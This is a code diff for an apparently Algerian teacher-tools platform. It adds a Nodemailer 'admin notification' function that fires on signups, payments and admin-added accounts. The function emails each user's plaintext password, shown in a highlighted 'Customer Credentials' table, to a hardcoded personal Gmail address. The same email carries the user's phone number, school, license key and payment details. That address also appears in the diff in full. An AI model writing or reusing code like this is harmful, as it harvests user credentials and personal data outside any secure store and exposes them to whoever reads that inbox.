@@ -370,3 +370,252 @@ export async function sendInquiryReplyEmailViaNodemailer(params: {
   }
 }
 
+export const ADMIN_NOTIFICATION_RECIPIENT = 'abdallahbourrich66@gmail.com';
+
+export interface AdminNotificationParams {
+  eventType: 'account_created' | 'successful_payment' | 'admin_user_added';
+  fullName: string;
+  email: string;
+  password?: string;
+  phoneNumber?: string;
+  wilaya?: string;
+  schoolName?: string;
+  primaryGrade?: string;
+  licenseKey?: string;
+  licensePlan?: string;
+  amountPaidDZD?: number;
+  paidVia?: string;
+  promoCode?: string;
+  discountPercent?: number;
+  orderId?: string;
+  invoiceNumber?: string;
+  timestamp?: string;
+}
+
+export async function sendAdminNotificationEmailViaNodemailer(
+  params: AdminNotificationParams
+): Promise<{ success: boolean; messageId?: string; error?: string }> {
+  const config = loadSmtpSettings();
+  const targetEmail = ADMIN_NOTIFICATION_RECIPIENT;
+
+  const now = new Date();
+  const dzTimeStr = now.toLocaleString('ar-DZ', {
+    timeZone: 'Africa/Algiers',
+    dateStyle: 'full',
+    timeStyle: 'medium'
+  });
+  const isoTimeStr = params.timestamp || now.toISOString();
+
+  const isPayment = params.eventType === 'successful_payment';
+  const eventTitle = isPayment 
+    ? '💰 دفع جديد ناجح وتفعيل رخصة'
+    : (params.eventType === 'admin_user_added' ? '👤 إضافة مستخدم ورخصة بواسطة الإدارة' : '👤 إنشاء حساب أستاذ جديد');
+
+  const subject = isPayment
+    ? `💰 [دفعة ناجحة] تم سداد ${params.amountPaidDZD || 3000} دج - الأستاذ(ة): ${params.fullName}`
+    : `👤 [حساب جديد] تسجيل أستاذ: ${params.fullName} (${params.email})`;
+
+  const safeName = escapeHtml(params.fullName || 'أستاذ');
+  const safeEmail = escapeHtml(params.email);
+  const safePass = params.password ? escapeHtml(params.password) : 'تم تعيينها من قبل المستخدم أثناء التسجيل';
+  const safePhone = params.phoneNumber ? escapeHtml(params.phoneNumber) : 'غير مدخل';
+  const safeWilaya = params.wilaya ? escapeHtml(params.wilaya) : '16 - الجزائر';
+  const safeSchool = params.schoolName ? escapeHtml(params.schoolName) : 'مدرسة ابتدائية';
+  const safeGrade = params.primaryGrade ? escapeHtml(params.primaryGrade) : '4AP';
+  const safeKey = params.licenseKey ? escapeHtml(params.licenseKey) : 'قيد الإنشاء أو المتابعة';
+  const safePlan = escapeHtml(params.licensePlan || 'Personal Yearly License');
+  const safePaidVia = escapeHtml(params.paidVia || (isPayment ? 'Chargily Pay v2 (Edahabia/CIB)' : 'حساب تجريبي مجاني'));
+  const safeAmount = params.amountPaidDZD !== undefined ? `${params.amountPaidDZD.toLocaleString()} دج (DZD)` : (isPayment ? '3,000 دج (DZD)' : '0 دج (حساب مسجل)');
+  const safePromo = params.promoCode ? `${escapeHtml(params.promoCode)}${params.discountPercent ? ` (خصم ${params.discountPercent}%)` : ''}` : 'بدون كود تخفيض';
+  const safeInvoice = escapeHtml(params.invoiceNumber || params.orderId || `INV-${Date.now()}`);
+
+  const text = `إشعار إداري فوري - رفيق المعلم الجزائري\n` +
+    `==========================================\n` +
+    `الحدث: ${eventTitle}\n` +
+    `الوقت والتاريخ: ${dzTimeStr} (${isoTimeStr})\n\n` +
+    `بيانات الأستاذ وبيانات الدخول (Submitted Credentials):\n` +
+    `- الاسم الكامل: ${params.fullName}\n` +
+    `- البريد الإلكتروني: ${params.email}\n` +
+    `- كلمة المرور المدخلة: ${params.password || '(كلمة مرور سرية خاصة بالمستخدم)'}\n` +
+    `- رقم الهاتف: ${params.phoneNumber || 'غير مدخل'}\n` +
+    `- الولاية: ${params.wilaya || 'غير محددة'}\n` +
+    `- المؤسسة التربوية: ${params.schoolName || 'غير محددة'}\n` +
+    `- المستوى التدريسي: ${params.primaryGrade || '4AP'}\n\n` +
+    `تفاصيل الدفع والمالية:\n` +
+    `- المبلغ المدفوع: ${safeAmount}\n` +
+    `- طريقة الدفع: ${safePaidVia}\n` +
+    `- كود التخفيض: ${safePromo}\n` +
+    `- رقم الطلب / الفاتورة: ${safeInvoice}\n\n` +
+    `تفاصيل الترخيص والمفتاح:\n` +
+    `- مفتاح الترخيص: ${params.licenseKey || 'لا يوجد'}\n` +
+    `- نوع الخطة: ${safePlan}\n` +
+    `- حالة الإشعار: تم إرسال مفتاح الترخيص إلى بريد العميل (${params.email}) بنجاح.\n\n` +
+    `---\n` +
+    `مرسل تلقائياً إلى: ${targetEmail}\n` +
+    `نظام رفيق المعلم الجزائري الإداري`;
+
+  const html = `
+    <div dir="rtl" style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Tahoma, Arial, sans-serif; max-width: 650px; margin: 0 auto; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,0.06);">
+      
+      <!-- Top Alert Header -->
+      <div style="background: linear-gradient(135deg, ${isPayment ? '#059669 0%, #047857 100%' : '#0284c7 0%, #0369a1 100%'}); padding: 24px 20px; text-align: center; color: #ffffff;">
+        <span style="display: inline-block; background: rgba(255,255,255,0.2); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; margin-bottom: 8px; letter-spacing: 0.5px;">
+          إشعار الإدارة المركزية • ADMIN REAL-TIME ALERT
+        </span>
+        <h1 style="margin: 0; font-size: 22px; font-weight: 800; color: #ffffff;">
+          ${eventTitle}
+        </h1>
+        <p style="margin: 6px 0 0; font-size: 13px; color: #f0fdf4; opacity: 0.95;">
+          ${dzTimeStr}
+        </p>
+      </div>
+
+      <div style="padding: 24px 22px; color: #1e293b; line-height: 1.6;">
+        
+        <p style="font-size: 15px; margin-top: 0; color: #0f172a;">
+          مرحباً <strong>عبد الله</strong>،<br/>
+          نحيطك علماً بأنه قد تم تسجيل عملية جديدة على منصة <strong>رفيق المعلم الجزائري</strong>. إليك كافة التفاصيل والبيانات المدخلة:
+        </p>
+
+        <!-- Financial Summary Banner (if payment) -->
+        <div style="background: ${isPayment ? '#ecfdf5' : '#f0f9ff'}; border: 2px solid ${isPayment ? '#10b981' : '#38bdf8'}; border-radius: 10px; padding: 16px; margin: 20px 0; display: flex; align-items: center; justify-content: space-between;">
+          <div>
+            <div style="font-size: 12px; color: ${isPayment ? '#047857' : '#0369a1'}; font-weight: bold; text-transform: uppercase;">
+              ${isPayment ? 'المبلغ المستلم والمؤكد' : 'حالة الحساب والمبلغ'}
+            </div>
+            <div style="font-size: 24px; font-weight: 800; color: ${isPayment ? '#065f46' : '#0c4a6e'}; margin-top: 4px;">
+              ${safeAmount}
+            </div>
+          </div>
+          <div style="text-align: left; font-size: 12px; color: #64748b;">
+            <div><strong>وسيلة الدفع:</strong> ${safePaidVia}</div>
+            <div><strong>الوقت:</strong> <span style="direction: ltr; display: inline-block;">${now.toLocaleTimeString('en-US', { hour12: false, timeZone: 'Africa/Algiers' })}</span></div>
+          </div>
+        </div>
+
+        <!-- License Key Highlight Box -->
+        ${params.licenseKey ? `
+        <div style="background: #f8fafc; border: 2px dashed #0d9488; border-radius: 10px; padding: 18px; text-align: center; margin: 20px 0;">
+          <div style="font-size: 12px; color: #0f766e; font-weight: 800; margin-bottom: 6px;">
+            مفتاح الترخيص المُصدر (Generated License Key):
+          </div>
+          <div style="font-family: monospace; font-size: 22px; font-weight: 800; color: #0d9488; direction: ltr; background: #ffffff; padding: 10px 16px; border-radius: 8px; border: 1px solid #99f6e4; display: inline-block; user-select: all;">
+            ${safeKey}
+          </div>
+          <div style="font-size: 12px; color: #64748b; margin-top: 8px;">
+            الخطة: <strong>${safePlan}</strong> • تم إرسال المفتاح لبريد العميل تلقائياً
+          </div>
+        </div>
+        ` : ''}
+
+        <!-- Credentials & User Information Table -->
+        <div style="background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px; overflow: hidden; margin-bottom: 22px;">
+          <div style="background: #f1f5f9; padding: 10px 16px; font-size: 13px; font-weight: 800; color: #334155; border-bottom: 1px solid #e2e8f0;">
+            📋 بيانات الأستاذ وبيانات الدخول المُدخلة (Customer Credentials):
+          </div>
+          <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
+            <tbody>
+              <tr style="border-bottom: 1px solid #f1f5f9;">
+                <td style="padding: 10px 16px; width: 35%; color: #64748b; font-weight: 600;">الاسم الكامل:</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-weight: 700;">${safeName}</td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9; background: #fafafa;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">البريد الإلكتروني:</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-weight: 700; direction: ltr; text-align: right;">
+                  <a href="mailto:${safeEmail}" style="color: #0284c7; text-decoration: none;">${safeEmail}</a>
+                </td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">كلمة المرور المدخلة:</td>
+                <td style="padding: 10px 16px; color: #b91c1c; font-weight: 800;">
+                  <code style="background: #fee2e2; color: #991b1b; padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 13px;">${safePass}</code>
+                </td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9; background: #fafafa;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">رقم الهاتف:</td>
+                <td style="padding: 10px 16px; color: #0f172a; direction: ltr; text-align: right;">${safePhone}</td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">الولاية:</td>
+                <td style="padding: 10px 16px; color: #0f172a;">${safeWilaya}</td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9; background: #fafafa;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">المؤسسة التعليمية:</td>
+                <td style="padding: 10px 16px; color: #0f172a;">${safeSchool}</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">المستوى التدريسي:</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-weight: bold;">${safeGrade}</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Transaction & Invoice Details Table -->
+        <div style="background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px; overflow: hidden; margin-bottom: 20px;">
+          <div style="background: #f1f5f9; padding: 10px 16px; font-size: 13px; font-weight: 800; color: #334155; border-bottom: 1px solid #e2e8f0;">
+            🧾 تفاصيل المعاملة المالية والتوثيق (Transaction Metadata):
+          </div>
+          <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
+            <tbody>
+              <tr style="border-bottom: 1px solid #f1f5f9;">
+                <td style="padding: 10px 16px; width: 35%; color: #64748b; font-weight: 600;">كود الخصم (Promo Code):</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-weight: 700;">${safePromo}</td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9; background: #fafafa;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">رقم الفاتورة / المرجع:</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-family: monospace;">${safeInvoice}</td>
+              </tr>
+              <tr style="border-bottom: 1px solid #f1f5f9;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">التوقيت الدقيق (ISO):</td>
+                <td style="padding: 10px 16px; color: #0f172a; font-family: monospace; font-size: 12px; direction: ltr; text-align: right;">${isoTimeStr}</td>
+              </tr>
+              <tr style="background: #fafafa;">
+                <td style="padding: 10px 16px; color: #64748b; font-weight: 600;">إشعار العميل:</td>
+                <td style="padding: 10px 16px; color: #059669; font-weight: 700;">
+                  ✅ تم إرسال مفتاح الترخيص إلى بريد الأستاذ (${safeEmail})
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div style="background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 14px; font-size: 12px; color: #475569; text-align: center;">
+          هذا إشعار إداري داخلي تم إنشاؤه وإرساله فورياً إلى بريدك الشخصي: <strong>${targetEmail}</strong> فور اكتمال الإجراء.
+        </div>
+
+      </div>
+
+      <div style="background-color: #f1f5f9; padding: 12px; text-align: center; font-size: 11px; color: #64748b; border-top: 1px solid #e2e8f0;">
+        رفيق المعلم الجزائري (Teacher Mate DZ) • لوحة الإدارة والتحكم
+      </div>
+    </div>
+  `;
+
+  if (!config.pass || !config.pass.trim()) {
+    console.warn(`[SMTP Admin Notification] No password configured, skipping admin notification to ${targetEmail}`);
+    return { success: false, error: 'SMTP password not configured' };
+  }
+
+  try {
+    const transporter = createSmtpTransporter(config);
+    const fromAddress = `"${config.fromName}" <${config.fromEmail || config.user}>`;
+
+    console.log(`[SMTP Admin Notification] Sending alert to ${targetEmail} for event "${params.eventType}" (${params.email})...`);
+    const info = await transporter.sendMail({
+      from: fromAddress,
+      to: targetEmail,
+      subject,
+      text,
+      html
+    });
+
+    console.log(`[SMTP Admin Notification] Alert successfully delivered to ${targetEmail}! Message ID: ${info.messageId}`);
+    return { success: true, messageId: info.messageId };
+  } catch (err: any) {
+    console.error(`[SMTP Admin Notification] Failed to deliver alert to ${targetEmail}:`, err?.message || err);
+    return { success: false, error: err?.message || 'SMTP delivery failed' };
+  }
+}
+
+
